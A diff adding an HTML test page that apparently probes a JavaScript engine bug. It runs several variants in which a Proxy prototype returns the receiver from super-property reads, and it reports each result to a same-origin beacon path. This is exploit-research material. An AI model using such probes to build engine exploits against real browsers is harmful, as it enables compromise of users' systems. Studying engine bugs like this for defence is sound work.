@@ -1,0 +1,39 @@
+<!doctype html><html><head><meta charset="utf-8"><title>scope-matrix</title></head><body>
+<script>
+function mark(t){ try { (new Image()).src = '/beacon/SCOPE-' + encodeURIComponent(String(t).slice(0,150)) + '?t=' + Date.now(); } catch(e){} }
+function d(v){ try { return v===null?'null':(v===undefined?'undefined':typeof v+':'+Object.prototype.toString.call(v)); } catch(e){ return 'DERR'; } }
+function run(name, fn){ try { var v = fn(); var extra=''; if (v && typeof v === 'object') { try { extra = ' keys=' + Object.getOwnPropertyNames(v).slice(0,5).join(','); } catch(e){ extra=' keyerr'; } } mark(name + '=' + d(v) + extra); } catch(e){ mark(name + ' ERR ' + e.message); } }
+mark('BOOT');
+run('A_method', function(){
+  class L { leak(){ return super.foo; } }
+  L.prototype.__proto__ = new Proxy({}, { get: function(t,p,r){ return r; } });
+  var f = L.prototype.leak; return f();
+});
+run('C_getter', function(){
+  class L { get leak(){ return super.foo; } }
+  L.prototype.__proto__ = new Proxy({}, { get: function(t,p,r){ return r; } });
+  var o = new L(); return o.leak;
+});
+run('D_static', function(){
+  class L { static leak(){ return super.foo; } }
+  Object.setPrototypeOf(L, new Proxy(function(){}, { get: function(t,p,r){ return r; } }));
+  return L.leak();
+});
+run('E_derived', function(){
+  var Base = new Proxy(function(){}, { get: function(t,p,r){ return r; } });
+  class D extends Base { m(){ return super.x; } }
+  var o = new D(); return o.m();
+});
+run('G_protoget', function(){
+  var o = {};
+  Object.setPrototypeOf(o, new Proxy({}, { get: function(t,p,r){ return r; } }));
+  return o.anything;
+});
+run('H_exact', function(){
+  class Leaker { leak() { return super.foo; } }
+  Leaker.prototype.__proto__ = new Proxy({}, { get: function (target, property, receiver) { return receiver; } });
+  const leak = Leaker.prototype.leak;
+  return (function () { return leak(); })();
+});
+mark('DONE');
+</script></body></html>
